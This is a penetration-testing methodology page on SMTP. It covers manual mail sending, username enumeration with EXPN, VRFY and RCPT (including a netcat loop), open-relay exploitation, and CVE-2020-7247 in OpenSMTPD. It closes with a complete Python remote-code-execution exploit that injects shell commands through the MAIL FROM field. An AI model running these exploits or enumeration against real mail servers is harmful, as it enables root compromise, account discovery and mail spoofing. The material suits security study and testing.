# Simple Mail Transfer Protocol (SMTP) - Methodology

### SMTP client

###### Manual sender

The `telnet` or `netcat` utilities can be used to send mail through a SMTP
service:

```
telnet/nc <IP> <PORT>
HELO <DOMAIN>
334 VXNlcm5hbWU6
<BASE64_USERNAME>
334 UGFzc3dvcmQ6
<BASE64_PASSWORD>
235 authenticated.
MAIL FROM:<USERNAME>@<DOMAIN>
RCPT TO:<USERNAME>@<DOMAIN>
<DATA>
.
```

The `telnet` or `netcat` utilities do not support the use of SSL / TLS. If the
SMTP service requires the use of the SSL / TLS layer, for instance for services
exposed on the TCP port 587, the `openssl` utility can be used as basic SMTP
client:

```
openssl s_client -starttls smtp -crlf -connect <HOSTNAME | IP>:<PORT>
```   

A SMTP service exposed on the TCP port 25 may also require the use of the
SSL / TLS by only supporting the `STARTTLS` SMTP command:

```
telnet <HOSTNAME | IP> <PORT>

EHLO
[...]
250-SIZE X
250-STARTTLS
250 OK
```   

###### Automated sender

The `sendemail` utility can be used to send emails, optionally with file
attachment(s), through an exposed SMTP service:

```
sendemail -t <RCPT_EMAIL> -f <FROM_EMAIL> -u '<MAIL_SUBJECT>' -m '<MAIL_BODY>' -s <SMTP_SERVER>[:<SMTP_PORT> [-a <FILE> [<FILE2> ...]]
```

### User Enumeration

The `EXPN`, `VRFY` and `RCPT` commands can be used, if they have not been
disabled, to enumerate valid username.  

The `EXPN` command is used to reveal the actual address of users aliases and
lists of email. The `VRFY` command can confirm the existence of names of valid
users.

The enumeration can be conducted manually using the `telnet` or `netcat`
utilities or automatically using `Metasploit`, `nmap` or `smtp-user-enum`.

###### Manual enumeration

The following commands can be used to check if the `EXPN`, `VRFY` and `RCPT`
commands are available and to manually enumerate valid usernames and emails:

```
telnet/nc <IP> <PORT>
...

---

EXPN <USERNAME>
-> 250 2.1.5 <USERNAME@DOMAIN>
-> 550 5.1.1 <USERNAME>... User unknown

---

VRFY <USERNAME>
-> 250 2.1.5 <USERNAME@DOMAIN>
-> 550 5.1.1 <USERNAME>... User unknown

---

MAIL FROM: fake@localhost.com
RCPT TO: <USERNAME>
-> 250 2.1.5 <USERNAME>... Recipient ok
-> 550 5.1.1 <USERNAME>... User unknown

---
```

###### Automatic enumeration

The `smtp-user-enum` can be used to automatically enumerate usernames:

```
smtp-user-enum [-M EXPN/VRFY/RCPT ] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
```

The following bash one-liner may be used as well to automatically enumerate
usernames:

```
for x in $(cat <USERFILE>); do echo VRFY $x | nc -nv -w 1 <TARGET> <PORT> 2>/dev/null | grep ^’250’; done
```

The `smtp-enum-users` `nmap` script and the `auxiliary/scanner/smtp/smtp_enum`
`Metasploit` module can be used as well.

### Open relay

An SMTP server that works as an open relay, is a email server that does not
verify if the user is authorized to send email from the specified email
address. Therefore, users would be able to send email originating from any
third-party email address.

While fully open relay is not that usual, "Partially Open Mail Relay" are more
common.  
This occurs when the mail relay can be used to do one of the following:
  - email from an external source address to an internal destination address ;
  - email from an internal source address to an internal destination address.

###### Manual exploitation

the following commands can be used to manually exploit an open relay SMTP
server:

```
telnet/nc <IP> <PORT>
HELO
# HELO <DOMAIN>
MAIL FROM:<USERNAME>@<CURRENT_DOMAIN>
RCPT TO:user@otherdom.com
DATA
.
```

If relaying is not permitted, the server should respond with an error message
"Relaying denied".

###### Automatic detection and exploitation

The `smtp-open-relay.nse` `nmap` script can be used to detect open relay.  

The `scanner/smtp/smtp_relay` `Metasploit` module can be used to exploit a
misconfigured server.

### Known vulnerabilities

###### LPE and RCE in OpenSMTPD (CVE-2020-7247)

Due to a default in the way shell metacharacters are filtered, a vulnerability
arise in `OpenBSD Simple Mail Transfer Protocol Daemon (OpenSMTPD) < 6.6.2`.
`OpenSMTPD` was initially developed for OpenBSD but is currently used by
others distros : FreeBSD, Debian, Ubuntu, Fedora, RHEL, etc.

The vulnerability permit the execution of code as root:
  - either locally if `OpenSMTPD` listens on the loopback interface and only
  accepts mail from localhost (default configuration)
  - or both locally and remotely, if `OpenSMTPD` listens on all interfaces and
  accepts external mail

More information about the vulnerability specifics:
`https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt`.

The following Proof of Concept exploit code can be used to exploit the
vulnerability:

```
# Source : https://www.exploit-db.com/exploits/47984

# Exploit Title: OpenSMTPD 6.6.2 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Original Author: Qualys Security Advisory
# Vendor Homepage: https://www.opensmtpd.org/
# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
# Version: OpenSMTPD < 6.6.2
# Tested on: Debian 9.11 (x64)
# CVE: CVE-2020-7247
# References:
# https://www.openwall.com/lists/oss-security/2020/01/28/3
#
# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
# escape dangerous characters from user-controlled input. An attacker
# can exploit this to execute arbitrary shell commands on the target.
#
#!/usr/local/bin/python3

from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = sys.argv[3]

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

res = s.recv(1024)
if 'OpenSMTPD' not in str(res):
    print('[!] No OpenSMTPD detected')
    print('[!] Received {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] OpenSMTPD detected')
s.send(b'HELO x\r\n')
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error connecting, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Connected, sending payload')
s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error sending payload, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Payload sent')
s.send(b'RCPT TO:<root>\r\n')
s.recv(1024)
s.send(b'DATA\r\n')
s.recv(1024)
s.send(b'\r\nxxx\r\n.\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.recv(1024)
print('[*] Done')
```
